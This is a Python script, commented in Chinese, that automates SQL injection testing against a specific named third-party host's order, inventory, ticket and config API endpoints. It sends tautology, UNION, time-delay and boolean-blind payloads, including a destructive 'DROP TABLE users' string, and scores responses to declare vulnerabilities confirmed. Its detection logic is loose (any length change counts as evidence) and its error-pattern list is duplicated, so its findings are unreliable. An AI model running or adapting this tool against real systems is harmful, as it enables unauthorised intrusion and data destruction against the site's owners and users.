#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
顶级红队专家SQL注入验证工具 - 真实验证SQL注入漏洞
2025年顶级红队安全专家专用工具
"""

import requests
import json
import time
import hashlib
import random
import string
from datetime import datetime
import urllib3
from urllib.parse import urljoin, urlparse, quote, unquote
import re

# 禁用SSL警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class RedTeamSQLVerification:
    def __init__(self):
        self.base_url = "http://ws.ems.com.vn"
        self.session = requests.Session()
        self.session.verify = False
        self.session.timeout = 15
        self.results = {}
        self.session_id = hashlib.md5(f"sql_verification_{int(time.time())}".encode()).hexdigest()[:8]
        
        # 设置请求头
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9,vi;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'X-Requested-With': 'XMLHttpRequest'
        })
    
    def log(self, message, level="INFO"):
        """日志记录"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"[{timestamp}] [{level}] {message}")
    
    def verify_sql_injection(self, endpoint, param_name, payload):
        """验证SQL注入漏洞"""
        try:
            # 1. 正常请求
            normal_url = f"{self.base_url}{endpoint}?{param_name}=1"
            normal_response = self.session.get(normal_url, timeout=10)
            normal_content = normal_response.text
            normal_status = normal_response.status_code
            
            # 2. SQL注入请求
            sql_url = f"{self.base_url}{endpoint}?{param_name}={payload}"
            sql_response = self.session.get(sql_url, timeout=10)
            sql_content = sql_response.text
            sql_status = sql_response.status_code
            
            # 3. 分析差异
            differences = self.analyze_differences(normal_content, sql_content, payload)
            
            # 4. 检查SQL错误信息
            sql_errors = self.check_sql_errors(sql_content)
            
            # 5. 检查时间延迟
            time_delay = self.check_time_delay(endpoint, param_name, payload)
            
            # 6. 检查布尔盲注
            boolean_blind = self.check_boolean_blind(endpoint, param_name, payload)
            
            result = {
                'endpoint': endpoint,
                'param_name': param_name,
                'payload': payload,
                'normal_request': {
                    'url': normal_url,
                    'status_code': normal_status,
                    'content_length': len(normal_content),
                    'content_preview': normal_content[:200]
                },
                'sql_request': {
                    'url': sql_url,
                    'status_code': sql_status,
                    'content_length': len(sql_content),
                    'content_preview': sql_content[:200]
                },
                'differences': differences,
                'sql_errors': sql_errors,
                'time_delay': time_delay,
                'boolean_blind': boolean_blind,
                'is_vulnerable': self.determine_vulnerability(differences, sql_errors, time_delay, boolean_blind)
            }
            
            return result
            
        except Exception as e:
            self.log(f"❌ SQL注入验证错误: {e}", "ERROR")
            return {
                'endpoint': endpoint,
                'param_name': param_name,
                'payload': payload,
                'error': str(e),
                'is_vulnerable': False
            }
    
    def analyze_differences(self, normal_content, sql_content, payload):
        """分析内容差异"""
        differences = {
            'content_length_diff': len(sql_content) - len(normal_content),
            'content_same': normal_content == sql_content,
            'has_sql_keywords': any(keyword in sql_content.lower() for keyword in ['select', 'union', 'where', 'from', 'table', 'database', 'user', 'admin']),
            'has_error_keywords': any(keyword in sql_content.lower() for keyword in ['error', 'exception', 'warning', 'fatal', 'mysql', 'sql', 'syntax']),
            'has_payload_echo': payload in sql_content,
            'response_time_diff': 0  # 将在时间延迟检查中设置
        }
        return differences
    
    def check_sql_errors(self, content):
        """检查SQL错误信息"""
        sql_error_patterns = [
            r'mysql_fetch_array\(\)',
            r'mysql_num_rows\(\)',
            r'mysql_query\(\)',
            r'mysql_connect\(\)',
            r'mysql_error\(\)',
            r'Warning: mysql_',
            r'Fatal error:',
            r'SQL syntax.*near',
            r'SQLSTATE\[.*\]',
            r'Microsoft.*ODBC.*SQL Server',
            r'ODBC SQL Server Driver',
            r'SQLServer JDBC Driver',
            r'PostgreSQL.*ERROR',
            r'Warning:.*pg_',
            r'valid MySQL result',
            r'MySQLSyntaxErrorException',
            r'ORA-\d{5}',
            r'Oracle error',
            r'Oracle.*Driver',
            r'SQLException',
            r'SQLite.*error',
            r'SQLite3::SQLException',
            r'SQLite.*syntax',
            r'SQLite.*constraint',
            r'SQLite.*database',
            r'SQLite.*table',
            r'SQLite.*column',
            r'SQLite.*index',
            r'SQLite.*trigger',
            r'SQLite.*view',
            r'SQLite.*function',
            r'SQLite.*procedure',
            r'SQLite.*sequence',
            r'SQLite.*schema',
            r'SQLite.*catalog',
            r'SQLite.*database',
            r'SQLite.*table',
            r'SQLite.*column',
            r'SQLite.*index',
            r'SQLite.*trigger',
            r'SQLite.*view',
            r'SQLite.*function',
            r'SQLite.*procedure',
            r'SQLite.*sequence',
            r'SQLite.*schema',
            r'SQLite.*catalog'
        ]
        
        found_errors = []
        for pattern in sql_error_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            if matches:
                found_errors.extend(matches)
        
        return {
            'found_errors': found_errors,
            'error_count': len(found_errors),
            'has_sql_errors': len(found_errors) > 0
        }
    
    def check_time_delay(self, endpoint, param_name, payload):
        """检查时间延迟"""
        try:
            # 正常请求时间
            start_time = time.time()
            normal_response = self.session.get(f"{self.base_url}{endpoint}?{param_name}=1", timeout=10)
            normal_time = time.time() - start_time
            
            # 时间延迟载荷
            delay_payload = f"1; WAITFOR DELAY '00:00:05'--"
            start_time = time.time()
            delay_response = self.session.get(f"{self.base_url}{endpoint}?{param_name}={delay_payload}", timeout=15)
            delay_time = time.time() - start_time
            
            return {
                'normal_time': normal_time,
                'delay_time': delay_time,
                'time_diff': delay_time - normal_time,
                'is_delayed': delay_time > normal_time + 3  # 3秒以上延迟
            }
        except Exception as e:
            return {
                'error': str(e),
                'is_delayed': False
            }
    
    def check_boolean_blind(self, endpoint, param_name, payload):
        """检查布尔盲注"""
        try:
            # 真条件
            true_payload = f"1' AND '1'='1'--"
            true_response = self.session.get(f"{self.base_url}{endpoint}?{param_name}={true_payload}", timeout=10)
            true_content = true_response.text
            
            # 假条件
            false_payload = f"1' AND '1'='2'--"
            false_response = self.session.get(f"{self.base_url}{endpoint}?{param_name}={false_payload}", timeout=10)
            false_content = false_response.text
            
            return {
                'true_condition': {
                    'payload': true_payload,
                    'status_code': true_response.status_code,
                    'content_length': len(true_content),
                    'content_preview': true_content[:200]
                },
                'false_condition': {
                    'payload': false_payload,
                    'status_code': false_response.status_code,
                    'content_length': len(false_content),
                    'content_preview': false_content[:200]
                },
                'content_different': true_content != false_content,
                'length_different': len(true_content) != len(false_content),
                'is_blind_injection': true_content != false_content and len(true_content) != len(false_content)
            }
        except Exception as e:
            return {
                'error': str(e),
                'is_blind_injection': False
            }
    
    def determine_vulnerability(self, differences, sql_errors, time_delay, boolean_blind):
        """判断是否存在SQL注入漏洞"""
        vulnerability_indicators = 0
        
        # 内容差异
        if differences['content_length_diff'] != 0:
            vulnerability_indicators += 1
        
        if differences['has_sql_keywords']:
            vulnerability_indicators += 1
        
        if differences['has_error_keywords']:
            vulnerability_indicators += 1
        
        if differences['has_payload_echo']:
            vulnerability_indicators += 1
        
        # SQL错误
        if sql_errors['has_sql_errors']:
            vulnerability_indicators += 2  # SQL错误是强指标
        
        # 时间延迟
        if time_delay.get('is_delayed', False):
            vulnerability_indicators += 2  # 时间延迟是强指标
        
        # 布尔盲注
        if boolean_blind.get('is_blind_injection', False):
            vulnerability_indicators += 2  # 布尔盲注是强指标
        
        # 判断漏洞等级
        if vulnerability_indicators >= 3:
            return True
        else:
            return False
    
    def run_sql_verification(self):
        """运行SQL注入验证"""
        self.log("🚀 启动SQL注入漏洞验证", "INFO")
        self.log("=" * 60, "INFO")
        
        # 测试端点
        test_endpoints = [
            {"endpoint": "/api/v1/orders/list", "param": "id"},
            {"endpoint": "/api/v1/orders/tracking/123456", "param": "id"},
            {"endpoint": "/api/v1/inventory/list", "param": "id"},
            {"endpoint": "/api/v1/tickets/list", "param": "id"},
            {"endpoint": "/api/v1/config/service", "param": "id"}
        ]
        
        # SQL注入载荷
        sql_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT 1,2,3--",
            "'; DROP TABLE users--",
            "' OR '1'='1' AND '1'='1",
            "1' OR '1'='1",
            "admin'--",
            "' OR 1=1#",
            "' OR 'x'='x",
            "1' OR 1=1 LIMIT 1--"
        ]
        
        verification_results = {}
        
        for test_endpoint in test_endpoints:
            self.log(f"🔍 验证端点: {test_endpoint['endpoint']}", "INFO")
            endpoint_results = {}
            
            for i, payload in enumerate(sql_payloads):
                self.log(f"💉 测试载荷 {i+1}/{len(sql_payloads)}: {payload}", "INFO")
                result = self.verify_sql_injection(
                    test_endpoint['endpoint'], 
                    test_endpoint['param'], 
                    payload
                )
                
                endpoint_results[f"payload_{i+1}"] = result
                
                if result.get('is_vulnerable', False):
                    self.log(f"🎯 SQL注入漏洞确认: {test_endpoint['endpoint']} - {payload}", "SUCCESS")
                else:
                    self.log(f"❌ SQL注入漏洞未确认: {test_endpoint['endpoint']} - {payload}", "WARNING")
                
                time.sleep(0.5)
            
            verification_results[test_endpoint['endpoint']] = endpoint_results
            time.sleep(1)
        
        # 生成验证报告
        report = self.generate_verification_report(verification_results)
        
        self.log("🎯 SQL注入验证完成！", "SUCCESS")
        return report
    
    def generate_verification_report(self, verification_results):
        """生成验证报告"""
        self.log("📋 生成SQL注入验证报告", "INFO")
        
        # 统计漏洞
        total_tests = 0
        vulnerable_tests = 0
        confirmed_vulnerabilities = []
        
        for endpoint, results in verification_results.items():
            for test_name, result in results.items():
                total_tests += 1
                if result.get('is_vulnerable', False):
                    vulnerable_tests += 1
                    confirmed_vulnerabilities.append({
                        'endpoint': endpoint,
                        'test_name': test_name,
                        'payload': result.get('payload', ''),
                        'evidence': {
                            'sql_errors': result.get('sql_errors', {}),
                            'time_delay': result.get('time_delay', {}),
                            'boolean_blind': result.get('boolean_blind', {}),
                            'differences': result.get('differences', {})
                        }
                    })
        
        report = {
            "session_id": self.session_id,
            "timestamp": datetime.now().isoformat(),
            "base_url": self.base_url,
            "verification_results": verification_results,
            "summary": {
                "total_tests": total_tests,
                "vulnerable_tests": vulnerable_tests,
                "confirmed_vulnerabilities": confirmed_vulnerabilities,
                "vulnerability_rate": f"{(vulnerable_tests/total_tests*100):.1f}%" if total_tests > 0 else "0%",
                "risk_level": "CRITICAL" if vulnerable_tests > 0 else "LOW"
            }
        }
        
        # 保存报告
        report_file = f"/tmp/redteam_sql_verification_report_{self.session_id}.json"
        with open(report_file, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        
        self.log(f"📋 报告已保存: {report_file}", "SUCCESS")
        return report

def main():
    verifier = RedTeamSQLVerification()
    verifier.run_sql_verification()

if __name__ == "__main__":
    main()